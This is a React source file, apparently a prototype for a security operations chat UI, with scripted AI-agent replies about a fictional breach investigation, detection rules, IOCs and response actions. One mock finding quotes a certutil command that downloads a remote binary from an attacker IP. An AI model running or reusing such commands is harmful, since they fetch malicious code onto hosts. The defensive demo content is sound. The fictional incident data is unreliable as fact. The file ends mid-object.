/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

import React, { useState, useRef, useEffect, useCallback } from 'react';
import { css, keyframes } from '@emotion/react';
import { WATCH_CONFIGS } from '../../../common';
import type { WatchType } from '../../../common';
import { InvestigationThread } from './investigation_thread';
import type { InvestigationMessage } from './investigation_thread';

interface Attachment {
  type: 'timeline' | 'rules' | 'hosts' | 'stats';
  data: Record<string, unknown>;
}

interface FollowUp {
  label: string;
  watchType: WatchType;
  response: string;
  attachments?: Attachment[];
}

interface Message {
  id: string;
  role: 'user' | 'watch';
  text: string;
  watchType?: WatchType;
  attachments?: Attachment[];
  followUps?: FollowUp[];
}

interface ResponseDef {
  pattern: RegExp;
  watchType: WatchType;
  response: string;
  attachments?: Attachment[];
  followUps?: FollowUp[];
}

type Mode = 'ask' | 'investigation';

const INVESTIGATION_TRIGGERS = /lateral|svc-backup|incident|breach|case/i;


const INVESTIGATION_MESSAGES: InvestigationMessage[] = [
  {
    id: 'inv-1',
    sender: { type: 'user', name: 'You', avatarUrl: 'https://i.pravatar.cc/32?u=james-spiteri' },
    text: 'Show me what happened with the lateral movement from svc-backup-prod. Full timeline.',
    timestamp: 'Today at 14:31',
  },
  {
    id: 'inv-2',
    sender: { type: 'watch', name: 'Watch Officer', watchType: 'watch_officer' },
    text: "Here's the full lateral movement timeline for svc-backup-prod. The entire attack spanned 4 minutes 54 seconds from initial logon to detection.\n\nThe service account authenticated from jump-box-03 using interactive logon (unusual for a service account), then pivoted to 6 workstations via SMB before attempting credential extraction.",
    timestamp: 'Today at 14:31',
    attachments: [
      {
        type: 'timeline',
        data: {
          title: 'Lateral movement timeline',
          events: [
            { time: '14:23:07', action: 'Interactive logon from jump-box-03', severity: 'high' },
            { time: '14:24:12', action: 'SMB to dc-prod-01 (FAILED — access denied)', severity: 'medium' },
            { time: '14:24:45', action: 'SMB connections to 6 workstations (SUCCESS)', severity: 'critical' },
            { time: '14:25:01', action: 'Encoded PowerShell executed on all 6', severity: 'critical' },
            { time: '14:26:33', action: 'LSASS credential dump attempt (BLOCKED)', severity: 'high' },
            { time: '14:27:01', action: 'DC access via alternate creds (read-only)', severity: 'high' },
            { time: '14:27:58', action: 'Detection triggered — Watch Floor alerted', severity: 'medium' },
          ],
        },
      },
      {
        type: 'hosts',
        data: {
          title: 'Affected hosts',
          items: [
            { name: 'jump-box-03', status: 'source', action: 'Monitor' },
            { name: 'ws-fin-01', status: 'compromised', action: 'Isolated' },
            { name: 'ws-fin-02', status: 'compromised', action: 'Isolated' },
            { name: 'ws-hr-05', status: 'compromised', action: 'Isolated' },
            { name: 'srv-app-12', status: 'compromised', action: 'Isolated' },
            { name: 'dc-prod-01', status: 'attempted', action: 'Monitoring' },
          ],
        },
      },
    ],
  },
  {
    id: 'inv-3',
    sender: { type: 'analyst', name: 'Sarah Chen', avatarUrl: 'https://i.pravatar.cc/32?u=sarah-chen' },
    text: "I've seen this svc-backup-prod account behave oddly before — check the Feb 14 audit log. There was an after-hours auth from the same jump box that we closed as a false positive.",
    timestamp: 'Today at 14:33',
  },
  {
    id: 'inv-4',
    sender: { type: 'watch', name: 'Watch Floor', watchType: 'watch_floor' },
    text: "Cross-referencing Sarah's note — found 3 similar auth anomalies on Feb 14 that were dismissed as FP. All originated from jump-box-03 using the same service account, same off-hours pattern. In hindsight, this was likely initial access reconnaissance.",
    timestamp: 'Today at 14:33',
    attachments: [
      {
        type: 'stats',
        data: {
          title: 'Feb 14 correlation',
          items: [
            { label: 'Similar events', value: '3' },
            { label: 'Time window', value: '02:15-02:40' },
            { label: 'Originally classified', value: 'FP' },
            { label: 'Revised assessment', value: 'Recon' },
          ],
        },
      },
    ],
  },
  {
    id: 'inv-5',
    sender: { type: 'analyst', name: 'Marcus Rivera', avatarUrl: 'https://i.pravatar.cc/32?u=marcus-rivera' },
    text: "I'm taking point on containment. Approving isolation for the 4 compromised workstations now. James — can you approve the credential rotation for svc-backup-prod in the Decide tab?",
    timestamp: 'Today at 14:35',
  },
  {
    id: 'inv-6',
    sender: { type: 'watch', name: 'Dark Watch', watchType: 'dark_watch' },
    text: "Starting a broader hunt: checking all service accounts that authenticated from jump-box-03 in the last 90 days. If the attacker had access to this jump box, svc-backup-prod may not be the only compromised account.",
    timestamp: 'Today at 14:36',
  },
];

const INVESTIGATION_PARTICIPANTS: InvestigationMessage['sender'][] = [
  { type: 'user', name: 'You', avatarUrl: 'https://i.pravatar.cc/32?u=james-spiteri' },
  { type: 'analyst', name: 'Sarah Chen', avatarUrl: 'https://i.pravatar.cc/32?u=sarah-chen' },
  { type: 'analyst', name: 'Marcus Rivera', avatarUrl: 'https://i.pravatar.cc/32?u=marcus-rivera' },
  { type: 'watch', name: 'Watch Officer', watchType: 'watch_officer' },
  { type: 'watch', name: 'Watch Floor', watchType: 'watch_floor' },
  { type: 'watch', name: 'Dark Watch', watchType: 'dark_watch' },
];


const RESPONSES: ResponseDef[] = [
  {
    pattern: /suppress|12 rules|false positive|FP/i,
    watchType: 'watch_floor',
    response: `I suppressed those 12 rules because over 90 days, 99.4% of their 30,600 alerts came from known scanner IPs.\n\nEach suppressed technique still has ≥2 other active rules covering it from different data sources. Zero coverage loss.`,
    followUps: [
      {
        label: 'Show me the suppressed rules',
        watchType: 'watch_floor',
        response: 'Here are all 12 suppressed rules with their original alert volumes and the alternative coverage still active:\n\n1. Suspicious Network Connection — 89/day, covered by Netflow Anomaly + EDR Network\n2. Unusual Process Execution — 67/day, covered by ML Behavior + Sysmon Rule\n3. Port Scan Detection — 54/day, covered by Firewall IDS + Zeek\n4. DNS Query to Rare Domain — 42/day, covered by DNS Tunnel Detector + Threat Intel\n5. Encoded PowerShell — 38/day, covered by AMSI Rule + Script Block Logging\n6–12. (7 more rules with <30 alerts/day each)',
        attachments: [{ type: 'rules', data: { title: 'All 12 suppressed rules', items: [{ name: 'Suspicious Network Connection', alerts: 89, fpRate: 99.8 }, { name: 'Unusual Process Execution', alerts: 67, fpRate: 99.2 }, { name: 'Port Scan Detection', alerts: 54, fpRate: 99.9 }, { name: 'DNS Query to Rare Domain', alerts: 42, fpRate: 98.7 }, { name: 'Encoded PowerShell', alerts: 38, fpRate: 99.4 }] } }],
      },
      {
        label: 'What if scanners change IP?',
        watchType: 'watch_floor',
        response: 'Good question. Each suppression is tied to both the source IP AND the rule signature pattern. If scanners rotate IPs:\n\n• The suppression stops matching → alerts flow normally again\n• I run a weekly check comparing suppressed-IP traffic to new-IP traffic patterns\n• If a new IP matches the scanner fingerprint (user-agent, timing, targets), I propose extending the suppression\n\nYou\'d get a proposal within 24h of any drift. Zero silent failures.',
      },
      {
        label: 'Restore rule #3',
        watchType: 'watch_floor',
        response: 'Restored "Port Scan Detection" to active status. It will start generating alerts again immediately.\n\nExpected impact: ~54 additional alerts/day based on last 90-day average. 99.9% were from known scanners — you\'ll likely want to tune this with an exception list rather than full suppression.',
        attachments: [{ type: 'stats', data: { title: 'Restoration impact', items: [{ label: 'Expected alerts/day', value: '~54' }, { label: 'Previous FP rate', value: '99.9%' }, { label: 'Status', value: 'Active' }] } }],
      },
      {
        label: 'Show MITRE coverage',
        watchType: 'dark_watch',
        response: 'MITRE ATT&CK coverage after suppression — all techniques remain covered by at least 2 rules:\n\n• T1046 Network Scanning: 3 active rules (was 4)\n• T1059 Command & Scripting: 5 active rules (was 6)\n• T1071 Application Layer Protocol: 4 active rules (was 5)\n• T1021 Remote Services: 3 active rules (unchanged)\n\nTotal: 94.2% technique coverage across all tactics. No gaps introduced.',
        attachments: [{ type: 'stats', data: { title: 'Coverage summary', items: [{ label: 'Technique coverage', value: '94.2%' }, { label: 'Gaps introduced', value: '0' }, { label: 'Min rules/technique', value: '2' }] } }],
      },
    ],
    attachments: [
      {
        type: 'rules',
        data: {
          title: 'Suppressed rules',
          items: [
            { name: 'Suspicious Network Connection', alerts: 89, fpRate: 99.8 },
            { name: 'Unusual Process Execution', alerts: 67, fpRate: 99.2 },
            { name: 'Port Scan Detection', alerts: 54, fpRate: 99.9 },
            { name: 'DNS Query to Rare Domain', alerts: 42, fpRate: 98.7 },
            { name: 'Encoded PowerShell', alerts: 38, fpRate: 99.4 },
          ],
        },
      },
      {
        type: 'stats',
        data: {
          title: 'Impact',
          items: [
            { label: 'Alerts eliminated/day', value: '340' },
            { label: 'Analyst time recovered/wk', value: '6.5h' },
            { label: 'MITRE coverage lost', value: '0 techniques' },
          ],
        },
      },
    ],
  },
  {
    pattern: /lateral|svc-backup|timeline/i,
    watchType: 'watch_officer',
    response: `Here's the full lateral movement timeline for svc-backup-prod. The entire attack spanned 4 minutes 54 seconds from initial logon to detection.`,
    followUps: [
      {
        label: 'Isolate affected hosts',
        watchType: 'watch_officer',
        response: 'Starting containment for 4 compromised workstations:\n\n• ws-fin-01 — isolation initiated ✓\n• ws-fin-02 — isolation initiated ✓\n• ws-hr-05 — isolation initiated ✓\n• srv-app-12 — isolation initiated ✓\n\nAll 4 hosts are now network-isolated (agent connectivity maintained). jump-box-03 remains monitored — awaiting your decision on full isolation vs continued observation.',
        attachments: [{ type: 'stats', data: { title: 'Containment status', items: [{ label: 'Isolated', value: '4 hosts' }, { label: 'Monitoring', value: '2 hosts' }, { label: 'Time to contain', value: '12s' }, { label: 'Status', value: 'Active' }] } }],
      },
      {
        label: 'Show network connections',
        watchType: 'watch_officer',
        response: 'Network flow data for svc-backup-prod during the attack window (14:23–14:28):\n\nOutbound from jump-box-03:\n• → dc-prod-01:445 (SMB, DENIED)\n• → ws-fin-01:445, ws-fin-02:445, ws-hr-05:445, srv-app-12:445 (SMB, SUCCESS)\n• → ws-dev-03:445, ws-dev-09:445 (SMB, SUCCESS)\n\nSuspicious egress from compromised hosts:\n• ws-fin-01 → 185.234.xx.xx:443 (C2 callback attempt, BLOCKED by firewall)\n• srv-app-12 → internal-git:22 (lateral attempt, SUCCESS)',
        attachments: [{ type: 'stats', data: { title: 'Network summary', items: [{ label: 'Connections', value: '23' }, { label: 'Blocked', value: '3' }, { label: 'Suspicious', value: '8' }, { label: 'C2 attempts', value: '1' }] } }],
      },
      {
        label: 'Create case',
        watchType: 'watch_officer',
        response: 'Case created: SEC-2024-0847 — "Lateral Movement via svc-backup-prod"\n\n• Severity: Critical\n• Status: Active\n• Assigned: James Spiteri\n• Linked alerts: 14\n• Linked hosts: 6\n• Timeline attached with all events from 14:23–14:28\n\nMarcus Rivera and Sarah Chen have been notified.',
        attachments: [{ type: 'stats', data: { title: 'Case SEC-2024-0847', items: [{ label: 'Severity', value: 'Critical' }, { label: 'Alerts linked', value: '14' }, { label: 'Hosts', value: '6' }, { label: 'Status', value: 'Active' }] } }],
      },
      {
        label: 'Show me the raw query',
        watchType: 'watch_officer',
        response: 'Here\'s the ES|QL query used to build the timeline:\n\nFROM logs-endpoint.events.process*, logs-system.auth*\n| WHERE user.name == "svc-backup-prod"\n  AND @timestamp >= "2024-03-15T14:23:00"\n  AND @timestamp <= "2024-03-15T14:28:00"\n| SORT @timestamp ASC\n| KEEP @timestamp, host.name, event.action, process.name, source.ip, destination.ip\n\nThis returned 847 events, which I filtered to the 7 key actions shown in the timeline.',
      },
    ],
    attachments: [
      {
        type: 'timeline',
        data: {
          title: 'Lateral movement timeline',
          events: [
            { time: '14:23:07', action: 'Interactive logon from jump-box-03', severity: 'high' },
            { time: '14:24:12', action: 'SMB to dc-prod-01 (FAILED — access denied)', severity: 'medium' },
            { time: '14:24:45', action: 'SMB connections to 6 workstations (SUCCESS)', severity: 'critical' },
            { time: '14:25:01', action: 'Encoded PowerShell executed on all 6', severity: 'critical' },
            { time: '14:26:33', action: 'LSASS credential dump attempt (BLOCKED)', severity: 'high' },
            { time: '14:27:01', action: 'DC access via alternate creds (read-only)', severity: 'high' },
            { time: '14:27:58', action: 'Detection triggered — Watch Floor alerted', severity: 'medium' },
          ],
        },
      },
      {
        type: 'hosts',
        data: {
          title: 'Affected hosts',
          items: [
            { name: 'jump-box-03', status: 'source', action: 'Monitor' },
            { name: 'ws-fin-01', status: 'compromised', action: 'Isolated' },
            { name: 'ws-fin-02', status: 'compromised', action: 'Isolated' },
            { name: 'ws-hr-05', status: 'compromised', action: 'Isolated' },
            { name: 'srv-app-12', status: 'compromised', action: 'Isolated' },
            { name: 'dc-prod-01', status: 'attempted', action: 'Monitoring' },
          ],
        },
      },
    ],
  },
  {
    pattern: /MITRE|coverage|missing|gap/i,
    watchType: 'dark_watch',
    response: `Here are the 4 biggest MITRE ATT&CK coverage gaps I've identified. I've already drafted rules for the top 2 — want me to submit them as proposals?`,
    followUps: [
      {
        label: 'Draft rules for top 2',
        watchType: 'dark_watch',
        response: 'Here are the drafted detection rules:\n\n**T1574.002 — DLL Side-Loading**\n```\nprocess WHERE event.action == "start" AND\n  (process.pe.original_file_name != process.name) AND\n  process.code_signature.trusted == false AND\n  dll.path : ("C:\\\\ProgramData\\\\*", "C:\\\\Users\\\\*\\\\AppData\\\\*")\n```\n\n**T1048 — Exfil Over Alt Protocol**\n```\nnetwork WHERE event.action == "connection_attempted" AND\n  destination.port IN (53, 443, 8443) AND\n  source.bytes > 1000000 AND\n  NOT destination.ip IN (known_dns_servers)\n```\n\nBoth rules tuned to your environment. Submit as proposals?',
        attachments: [{ type: 'rules', data: { title: 'Drafted rules', items: [{ name: 'T1574.002 — DLL Side-Loading', alerts: 0, fpRate: 0, note: 'Ready for review' }, { name: 'T1048 — Exfil Over Alt Protocol', alerts: 0, fpRate: 0, note: 'Ready for review' }] } }],
      },
      {
        label: 'Show full matrix',
        watchType: 'dark_watch',
        response: 'Full MITRE ATT&CK coverage breakdown by tactic:\n\n• Initial Access (9 techniques): 7 covered, 2 gaps\n• Execution (12 techniques): 11 covered, 1 gap\n• Persistence (19 techniques): 16 covered, 3 gaps\n• Privilege Escalation (13 techniques): 11 covered, 2 gaps\n• Defense Evasion (42 techniques): 34 covered, 8 gaps\n• Credential Access (17 techniques): 14 covered, 3 gaps\n• Discovery (8 techniques): 8 covered, 0 gaps\n• Lateral Movement (9 techniques): 7 covered, 2 gaps\n• Collection (9 techniques): 6 covered, 3 gaps\n• Exfiltration (9 techniques): 5 covered, 4 gaps ← weakest\n• C2 (16 techniques): 13 covered, 3 gaps\n\nOverall: 132/163 sub-techniques covered (81%)',
        attachments: [{ type: 'stats', data: { title: 'Coverage by tactic', items: [{ label: 'Total coverage', value: '81%' }, { label: 'Weakest tactic', value: 'Exfiltration' }, { label: 'Techniques covered', value: '132/163' }, { label: 'Rules active', value: '247' }] } }],
      },
      {
        label: 'Compare to peer orgs',
        watchType: 'dark_watch',
        response: 'Comparing your coverage against organizations of similar size and industry (financial services, 1000–5000 endpoints):\n\n• Your coverage: 81% (132/163 techniques)\n• Peer median: 68% (111/163 techniques)\n• Top quartile: 85% (139/163 techniques)\n\nYou\'re above median in every tactic except Exfiltration (your weakest area). Closing the top 4 gaps I identified would put you at 84% — peer top quartile.',
        attachments: [{ type: 'stats', data: { title: 'Peer comparison', items: [{ label: 'Your coverage', value: '81%' }, { label: 'Peer median', value: '68%' }, { label: 'Top quartile', value: '85%' }, { label: 'Gap to close', value: '4 rules' }] } }],
      },
      {
        label: 'Map to data sources',
        watchType: 'dark_watch',
        response: 'Data source mapping for the 4 coverage gaps:\n\n• T1574.002 (DLL Side-Loading): Requires Sysmon + Endpoint agent with DLL events ✓ Available\n• T1048 (Exfil Alt Protocol): Requires network flow + DNS logs ✓ Available\n• T1055 (Process Injection): Requires Sysmon with CreateRemoteThread + memory scanning ⚠️ Partial — need Sysmon config update\n• T1218 (System Binary Proxy): Requires process execution logs ✓ Available\n\n3 of 4 gaps are closable with existing data. T1055 needs a Sysmon config change to capture CreateRemoteThread events.',
      },
    ],
    attachments: [
      {
        type: 'rules',
        data: {
          title: 'Coverage gaps',
          items: [
            { name: 'T1574.002 — DLL Side-Loading', alerts: 0, fpRate: 0, note: 'Rule drafted ✓' },
            { name: 'T1048 — Exfil Over Alt Protocol', alerts: 0, fpRate: 0, note: 'Rule drafted ✓' },
            { name: 'T1055 — Process Injection (advanced)', alerts: 0, fpRate: 0, note: 'Needs research' },
            { name: 'T1218 — System Binary Proxy Exec', alerts: 0, fpRate: 0, note: 'Partial coverage' },
          ],
        },
      },
    ],
  },
  {
    pattern: /DNS|tunnel|exfil|March|breach/i,
    watchType: 'deep_watch',
    response: `The attacker encoded stolen files into DNS queries — sending them as fake subdomain lookups to a server they controlled. Your security tools didn't flag it because DNS queries are normal traffic.\n\nTotal: 2.3 GB over 23 days (~100MB/day, spread across thousands of tiny queries).`,
    followUps: [
      {
        label: 'Show all 12 C2 domains',
        watchType: 'deep_watch',
        response: 'All 12 C2 domains used for DNS tunneling exfiltration:\n\n1. update-check.cloud (primary — 78% of traffic)\n2. cdn-assets-verify.net\n3. telemetry-ping.io\n4. config-sync-service.com\n5. ntp-pool-check.org\n6. cert-validation.net\n7. api-healthcheck.cloud\n8. dns-resolver-backup.io\n9. static-content-cdn.net\n10. metrics-collector.cloud\n11. patch-verify-service.com\n12. ssl-cert-check.io\n\nAll resolve to 185.234.xx.xx (AS13335). First seen: Mar 2. Last active: Mar 25.',
        attachments: [{ type: 'stats', data: { title: 'C2 infrastructure', items: [{ label: 'Domains', value: '12' }, { label: 'Unique IPs', value: '3' }, { label: 'ASN', value: 'AS13335' }, { label: 'Active period', value: '23 days' }] } }],
      },
      {
        label: 'Block at firewall',
        watchType: 'watch_officer',
        response: 'Firewall block rules submitted:\n\n• 12 domains added to DNS sinkhole ✓\n• 3 destination IPs blocked at perimeter firewall ✓\n• Added to threat intel blocklist for auto-propagation ✓\n\nBlocks are active across all egress points. Any historical connections from internal hosts to these indicators will trigger a retrospective alert within 5 minutes.',
        attachments: [{ type: 'stats', data: { title: 'Block status', items: [{ label: 'Domains blocked', value: '12' }, { label: 'IPs blocked', value: '3' }, { label: 'Propagation', value: 'Complete' }, { label: 'Retro-hunt', value: 'Running' }] } }],
      },
      {
        label: 'Generate IOC report',
        watchType: 'deep_watch',
        response: 'IOC Report generated — SEC-IOC-2024-0312\n\n**Network Indicators:**\n• 12 domains (listed above)\n• 3 IPs: 185.234.72.11, 185.234.72.44, 185.234.73.2\n• TLS cert SHA256: a4f2e8c9...\n\n**Host Indicators:**\n• Staging directory: C:\\ProgramData\\Microsoft\\Crypto\\Keys\\tmp\\\n• Process: svchost.exe spawning nslookup.exe in loop\n• Scheduled task: "CertificateValidator" (persistence)\n\n**Behavioral:**\n• DNS queries > 500 chars to rare TLDs\n• Subdomain entropy > 4.2 bits/char\n• Query volume: >200 queries/min sustained\n\nReport exported to case SEC-2024-0312. Ready to share with ISAC?',
        attachments: [{ type: 'stats', data: { title: 'IOC summary', items: [{ label: 'Network IOCs', value: '16' }, { label: 'Host IOCs', value: '4' }, { label: 'Behavioral', value: '3' }, { label: 'Confidence', value: 'High' }] } }],
      },
      {
        label: 'Run IOC sweep',
        watchType: 'deep_watch',
        response: 'Running IOC sweep across all endpoints and network logs...\n\nResults (7-day lookback):\n• 7 hosts communicated with C2 domains (already known from investigation)\n• 0 additional hosts found with staging directory pattern\n• 2 hosts show elevated DNS entropy but to different domains — flagged for review\n\nNo evidence of lateral spread beyond the original 7 compromised systems. The 2 flagged hosts appear to be legitimate CDN traffic (Akamai edge).',
        attachments: [{ type: 'stats', data: { title: 'Sweep results', items: [{ label: 'Hosts scanned', value: '2,400' }, { label: 'Matches', value: '7 (known)' }, { label: 'New findings', value: '0' }, { label: 'Flagged for review', value: '2' }] } }],
      },
    ],
    attachments: [
      {
        type: 'timeline',
        data: {
          title: 'Exfiltration timeline',
          events: [
            { time: 'Mar 2', action: 'Initial access via CVE-2024-21762', severity: 'critical' },
            { time: 'Mar 3-5', action: 'Internal recon + privilege escalation', severity: 'high' },
            { time: 'Mar 6', action: 'Data staging begins (C:\\ProgramData\\...)', severity: 'high' },
            { time: 'Mar 6-25', action: 'DNS tunneling exfil (~100MB/day)', severity: 'critical' },
            { time: 'Mar 25', action: 'Detected by anomalous DNS query volume', severity: 'medium' },
          ],
        },
      },
      {
        type: 'stats',
        data: {
          title: 'Breach metrics',
          items: [
            { label: 'Data exfiltrated', value: '2.3 GB' },
            { label: 'Dwell time', value: '23 days' },
            { label: 'Systems compromised', value: '7' },
            { label: 'Attribution', value: 'APT41' },
          ],
        },
      },
    ],
  },
];


const MORE_RESPONSES: ResponseDef[] = [
  {
    pattern: /status|what.*happening|what.*going on|overview|summary/i,
    watchType: 'watch_floor',
    response: `Here's your current status:\n\n• Watch Floor is triaging 23 new alerts — 19 auto-classified, 4 need enrichment\n• Watch Officer is waiting on your approval for lateral movement containment\n• Dark Watch is mid-hunt: checking for LOLBins in CI/CD hosts\n• Deep Watch is analyzing the memory dump from dev-ws-14\n\n8 proposals are pending your decision, 3 are critical severity.`,
    followUps: [
      {
        label: 'Show critical proposals',
        watchType: 'watch_floor',
        response: '3 critical proposals waiting for your decision:\n\n1. **Isolate jump-box-03** — Watch Officer recommends full isolation based on lateral movement evidence. Risk: blocks admin access for 12 users.\n2. **Rotate all service account creds** — triggered by svc-backup-prod compromise. Scope: 34 service accounts on affected OU.\n3. **Emergency rule deployment** — 2 new rules for DLL side-loading detected in today\'s hunt. Estimated 5 alerts/day, <2% FP.\n\nApprove, reject, or ask me about any of these.',
        attachments: [{ type: 'stats', data: { title: 'Critical proposals', items: [{ label: 'Awaiting decision', value: '3' }, { label: 'Oldest', value: '2h ago' }, { label: 'Auto-deadline', value: '4h' }] } }],
      },
      {
        label: 'Open Decide tab',
        watchType: 'watch_floor',
        response: 'Switching to the Decide tab where you can review all 8 pending proposals with full context, approve/reject in bulk, or delegate to team members.',
      },
      {
        label: 'What needs me most?',
        watchType: 'watch_officer',
        response: 'Priority stack right now:\n\n1. 🔴 **Lateral movement containment** — Marcus is waiting on your approval for credential rotation (svc-backup-prod). 2h pending.\n2. 🔴 **Jump-box-03 isolation** — Watch Officer proposed this 45 min ago. Blocking further investigation.\n3. 🟡 **LOLBin hunt findings** — Dark Watch found certutil on build-runner-07. Needs triage.\n\nThe containment approval is most urgent — it\'s blocking Marcus from completing the incident response.',
      },
    ],
    attachments: [
      {
        type: 'stats',
        data: {
          title: 'Current state',
          items: [
            { label: 'Pending proposals', value: '8' },
            { label: 'Critical', value: '3' },
            { label: 'Auto-actions today', value: '47' },
            { label: 'Watches active', value: '4/4' },
          ],
        },
      },
    ],
  },
  {
    pattern: /cost|expensive|token|spend|budget|how much/i,
    watchType: 'watch_floor',
    response: `Token costs over the last 30 days:\n\n• Watch Floor (Sonnet 4): $384 — handles high volume, lower cost per action\n• Watch Officer (Opus 4): $612 — fewer but deeper investigations\n• Dark Watch (Opus 4): $456 — long-running hunts, large context windows\n• Deep Watch (Opus 4): $892 — binary analysis and forensics, most expensive per-task\n\nTotal: $2,346 for 4,506 analyst hours saved. That's $0.52 per hour saved vs ~$75/hr loaded analyst cost.`,
    followUps: [
      {
        label: 'Reduce Deep Watch cost',
        watchType: 'watch_floor',
        response: 'Deep Watch is expensive because it uses Opus 4 for binary analysis with large context windows (avg 180k tokens/task). Options to reduce:\n\n1. **Limit concurrent analyses** — currently 3 parallel, reduce to 1 → saves ~40% ($357/mo)\n2. **Pre-filter with Sonnet** — use Sonnet 4 for initial triage, escalate to Opus only for confirmed suspicious → saves ~55% ($490/mo)\n3. **Reduce retention lookback** — currently analyzes 30-day history per binary, reduce to 7-day → saves ~25% ($223/mo)\n\nRecommendation: Option 2 gives best savings with minimal detection loss. Want me to draft the config change?',
        attachments: [{ type: 'stats', data: { title: 'Cost reduction options', items: [{ label: 'Current cost', value: '$892/mo' }, { label: 'Best saving', value: '55%' }, { label: 'Recommended', value: 'Option 2' }] } }],
      },
      {
        label: 'Show cost trend',
        watchType: 'watch_floor',
        response: 'Monthly cost trend (last 6 months):\n\n• Jan: $1,820 (ramp-up, tuning phase)\n• Feb: $2,105 (Dark Watch added)\n• Mar: $2,890 (breach investigation — 3x normal Deep Watch usage)\n• Apr: $2,346 (current — stabilized)\n• Projected May: $2,200 (downward trend from fewer FPs)\n\nThe March spike was the DNS tunneling incident — Deep Watch analyzed 43 memory dumps in one week. That\'s not expected to recur monthly.',
        attachments: [{ type: 'stats', data: { title: '6-month trend', items: [{ label: 'Peak', value: '$2,890' }, { label: 'Current', value: '$2,346' }, { label: 'Projected', value: '$2,200' }, { label: 'Trend', value: '↓ 6%' }] } }],
      },
      {
        label: 'Compare to last month',
        watchType: 'watch_floor',
        response: 'Month-over-month comparison (March → April):\n\n• Watch Floor: $310 → $384 (+24%, more rules tuned)\n• Watch Officer: $580 → $612 (+6%, stable)\n• Dark Watch: $445 → $456 (+2%, stable)\n• Deep Watch: $1,555 → $892 (-43%, breach investigation ended)\n\nTotal: $2,890 → $2,346 (-19%). The decrease is almost entirely from Deep Watch normalizing post-incident.',
        attachments: [{ type: 'stats', data: { title: 'Month-over-month', items: [{ label: 'Mar total', value: '$2,890' }, { label: 'Apr total', value: '$2,346' }, { label: 'Change', value: '-19%' }, { label: 'Biggest drop', value: 'Deep Watch' }] } }],
      },
    ],
    attachments: [
      {
        type: 'stats',
        data: {
          title: '30-day ROI',
          items: [
            { label: 'Total cost', value: '$2,346' },
            { label: 'Hours saved', value: '4,506' },
            { label: 'Cost/hr saved', value: '$0.52' },
            { label: 'ROI', value: '144x' },
          ],
        },
      },
    ],
  },
  {
    pattern: /isolat|contain|block|disable|respond|action|kill.*process|quarantine/i,
    watchType: 'watch_officer',
    response: `I can help you take response actions. What would you like to do?\n\n• Isolate a host (requires approval in human-in-loop mode)\n• Disable a user account\n• Block IPs at the firewall\n• Kill a process on an endpoint\n• Trigger a full containment playbook\n\nTell me the target and I'll draft the action for your approval.`,
    followUps: [
      {
        label: 'Isolate jump-box-03',
        watchType: 'watch_officer',
        response: 'Isolation request for jump-box-03 submitted.\n\n⚠️ This host is classified as critical infrastructure — 12 admin users rely on it for production access. Isolation requires Tier 2 approval.\n\nI\'ve notified Marcus Rivera (on-call Tier 2) for approval. Expected response within 15 minutes. In the meantime, I\'ve increased monitoring sensitivity on this host to maximum.',
        attachments: [{ type: 'stats', data: { title: 'Isolation request', items: [{ label: 'Host', value: 'jump-box-03' }, { label: 'Impact', value: '12 users' }, { label: 'Approval', value: 'Pending T2' }, { label: 'Monitoring', value: 'Maximum' }] } }],
      },
      {
        label: 'Disable svc-backup-prod',
        watchType: 'watch_officer',
        response: 'Service account svc-backup-prod disabled in Active Directory.\n\n• Account status: Disabled ✓\n• Active sessions: Force-terminated (3 sessions) ✓\n• Kerberos tickets: Invalidated ✓\n• Dependent services: backup-scheduler, nightly-archive (both will fail until account is rotated)\n\nI\'ve created a ticket for the infrastructure team to provision a replacement account with tighter permissions.',
        attachments: [{ type: 'stats', data: { title: 'Account action', items: [{ label: 'Status', value: 'Disabled' }, { label: 'Sessions killed', value: '3' }, { label: 'Affected services', value: '2' }] } }],
      },
      {
        label: 'Show pending actions',
        watchType: 'watch_officer',
        response: 'Currently pending response actions:\n\n1. Isolate jump-box-03 — awaiting Tier 2 approval (submitted 5 min ago)\n2. Credential rotation for svc-backup-prod — awaiting your approval\n3. Block 185.234.72.xx/24 at perimeter — scheduled for maintenance window (tonight 02:00)\n4. Deploy emergency rules (DLL side-loading) — awaiting testing completion\n\nNothing is overdue. Action #1 is most time-sensitive.',
      },
    ],
  },
  {
    pattern: /LOL[Bb]in|living.off.the.land|CI\/CD|build.*server|pipeline/i,
    watchType: 'dark_watch',
    response: `Starting hypothesis hunt: LOLBins in CI/CD environment.\n\nScoping now — I'll check for certutil, mshta, regsvr32, rundll32, and msiexec execution on all hosts tagged as CI/CD infrastructure.`,
    followUps: [
      {
        label: 'Show just certutil hits',
        watchType: 'dark_watch',
        response: 'certutil.exe findings on build-runner-07:\n\nSingle execution at 2024-04-12T03:14:22Z by SYSTEM account:\n```\ncertutil.exe -urlcache -split -f http://185.234.72.11/update.bin C:\\ProgramData\\tmp\\svc.exe\n```\n\nThis is a classic LOLBin download — certutil used to fetch a remote binary and write it to a staging directory. The source IP (185.234.72.11) matches C2 infrastructure from the March breach.\n\nThe downloaded file (svc.exe) was never executed — endpoint protection quarantined it 400ms after write.',
        attachments: [{ type: 'timeline', data: { title: 'certutil execution timeline', events: [{ time: '03:14:22', action: 'certutil.exe spawned by jenkins-agent.exe', severity: 'critical' }, { time: '03:14:23', action: 'HTTP GET to 185.234.72.11/update.bin', severity: 'critical' }, { time: '03:14:24', action: 'File written: C:\\ProgramData\\tmp\\svc.exe (2.1MB)', severity: 'high' }, { time: '03:14:24', action: 'Endpoint protection quarantine triggered', severity: 'medium' }, { time: '03:14:25', action: 'Execution blocked — file in quarantine', severity: 'medium' }] } }],
      },
      {
        label: 'Expand to all servers',
        watchType: 'dark_watch',
        response: 'Expanding scope from 34 CI/CD hosts to full fleet (2,400 hosts)...\n\nQuery running: checking 7-day window for certutil, mshta, regsvr32, rundll32, msiexec with suspicious arguments across all server endpoints.\n\nInitial results (30s in):\n• 2,400 hosts scoped ✓\n• 14 LOLBin executions found (vs 2 in CI/CD-only scope)\n• 8 are known-good (software deployment tools)\n• 6 require investigation\n\nFull analysis completing in ~2 minutes.',
        attachments: [{ type: 'stats', data: { title: 'Expanded hunt', items: [{ label: 'Hosts scoped', value: '2,400' }, { label: 'LOLBin hits', value: '14' }, { label: 'Known-good', value: '8' }, { label: 'Investigate', value: '6' }] } }],
      },
      {
        label: 'Add to scheduled hunts',
        watchType: 'dark_watch',
